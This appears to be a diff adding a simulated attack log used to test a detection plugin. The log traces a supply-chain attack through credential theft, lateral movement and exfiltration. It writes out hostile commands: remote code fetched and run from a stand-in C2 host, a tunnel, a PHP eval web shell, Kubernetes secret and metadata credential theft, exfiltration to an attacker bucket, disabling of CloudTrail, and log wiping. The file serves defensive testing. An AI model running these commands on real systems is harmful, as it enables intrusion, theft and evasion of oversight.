@@ -1,0 +1,50 @@
+# ══════════════════════════════════════════════════════════════════
+# SIMULATED LOG — Multi-Stage Blended Attack Campaign
+# Scenario: Supply Chain → Multiple Execution → Full Kill Chain
+# Covers 12+ techniques across the MITRE ATT&CK framework
+# For testing PredictiveAttackPath plugin
+# ══════════════════════════════════════════════════════════════════
+
+[2025-08-01T09:00:00Z] PKG-MIRROR: npm audit alert — dependency confusion detected
+    Package: @internal/auth-helper (typosquatted as @lnternal/auth-helper on public npm)
+    Malicious version 9.9.9 pulled by CI pipeline
+[2025-08-01T09:00:05Z] CI-RUNNER-03: npm install completed — trojanized package installed via dependency confusion
+[2025-08-01T09:01:00Z] CI-RUNNER-03 auditd: node -e "require('child_process').exec('curl http://c2.evil.example/stage1.sh | bash')"
+[2025-08-01T09:01:05Z] CI-RUNNER-03: wget http://c2.evil.example/tools/chisel -O /tmp/.system-health
+[2025-08-01T09:01:10Z] CI-RUNNER-03: chmod +x /tmp/.system-health
+[2025-08-01T09:01:15Z] CI-RUNNER-03: /tmp/.system-health client --fingerprint XXXX c2.evil.example:8443 R:1080:socks (chisel tunnel established)
+[2025-08-01T09:02:00Z] CI-RUNNER-03 auditd: execve="/usr/bin/env" "python3" "-c" "import os; os.system('id; hostname; cat /etc/os-release')"
+[2025-08-01T09:02:10Z] CI-RUNNER-03 auditd: execve="/usr/bin/docker" "ps" (container discovery)
+[2025-08-01T09:02:15Z] CI-RUNNER-03 auditd: execve="/usr/bin/kubectl" "get" "pods" "--all-namespaces" (kubernetes discovery)
+[2025-08-01T09:02:20Z] CI-RUNNER-03 auditd: execve="/usr/bin/kubectl" "get" "secrets" "--all-namespaces" "-o" "json"
+[2025-08-01T09:03:00Z] CI-RUNNER-03: Extracted AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from Kubernetes secrets
+[2025-08-01T09:03:05Z] CloudTrail: AssumeRole by CI-RUNNER-03 IAM role → arn:aws:iam::123456789012:role/admin-role
+[2025-08-01T09:03:10Z] CloudTrail: aws iam create-access-key --user-name backdoor-admin (persistence via cloud credentials)
+[2025-08-01T09:03:15Z] CloudTrail: aws s3 ls s3:// (cloud storage discovery)
+[2025-08-01T09:03:20Z] CloudTrail: aws ec2 describe-instances --region us-east-1 (cloud infrastructure discovery)
+[2025-08-01T09:04:00Z] PROD-WEB-01 sshd[8832]: Accepted publickey from 10.20.30.40 port 22
+[2025-08-01T09:04:05Z] PROD-WEB-01 auditd: execve="/bin/bash" "-c" "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+[2025-08-01T09:04:10Z] PROD-WEB-01: Instance metadata API accessed — IAM credentials harvested
+[2025-08-01T09:05:00Z] PROD-WEB-01 auditd: file_write="/var/www/html/wp-content/uploads/.status.php"
+    Content: <?php eval($_POST['cmd']); ?> (web shell uploaded — china chopper variant)
+[2025-08-01T09:05:30Z] PROD-WEB-01 apache: POST /wp-content/uploads/.status.php 200 — web shell command execution
+[2025-08-01T09:06:00Z] PROD-WEB-01 auditd: execve="/usr/bin/find" "/" "-perm" "-4000" "-type" "f" (SUID binary enumeration for privesc)
+[2025-08-01T09:06:10Z] PROD-WEB-01 auditd: exploit CVE-2021-4034 (pwnkit local privilege escalation) — now running as root
+[2025-08-01T09:07:00Z] PROD-WEB-01 auditd: file_write="/etc/systemd/system/system-health.service"
+    [Service]
+    ExecStart=/tmp/.system-health --daemon
+    Restart=always
+[2025-08-01T09:07:05Z] PROD-WEB-01: systemctl daemon-reload && systemctl enable system-health.service
+[2025-08-01T09:08:00Z] PROD-WEB-01: proxychains nmap -sT -p 22,80,443,3306,5432 10.20.30.0/24 (internal network scan via tunnel)
+[2025-08-01T09:10:00Z] DB-PROD-01 sshd[2211]: Accepted publickey from 10.20.30.50 (lateral movement from PROD-WEB-01)
+[2025-08-01T09:10:10Z] DB-PROD-01 auditd: pg_dumpall > /tmp/.pg_backup.sql (database exfil)
+[2025-08-01T09:10:30Z] DB-PROD-01 auditd: tar czf /tmp/.backup.tar.gz /tmp/.pg_backup.sql /etc/ssl/private/
+[2025-08-01T09:11:00Z] CloudTrail: aws s3 cp /tmp/.backup.tar.gz s3://attacker-bucket-xyzzy/exfil/ (exfiltration to cloud storage)
+[2025-08-01T09:12:00Z] CloudTrail: aws cloudtrail stop-logging --name management-trail (disable cloud logging)
+[2025-08-01T09:12:30Z] PROD-WEB-01 auditd: rm -rf /tmp/.system-health /tmp/.pg_backup.sql /tmp/.backup.tar.gz
+[2025-08-01T09:12:35Z] PROD-WEB-01 auditd: truncate -s 0 /var/log/auth.log /var/log/syslog
+[2025-08-01T09:13:00Z] PROD-WEB-01 auditd: echo "" > /home/www-data/.bash_history
+[2025-08-01T09:13:05Z] PROD-WEB-01 auditd: touch -t 202507010000.00 /var/log/auth.log (timestomp to cover tracks)
+[2025-08-01T09:15:00Z] SIEM CORRELATION: HIGH PRIORITY — Multi-stage attack detected across CI-RUNNER-03, PROD-WEB-01, DB-PROD-01
+    Kill chain progression: Initial Access → Execution → Discovery → Persistence → Privilege Escalation → Lateral Movement → Collection → Exfiltration → Defense Evasion
+    Estimated 15+ MITRE ATT&CK techniques involved
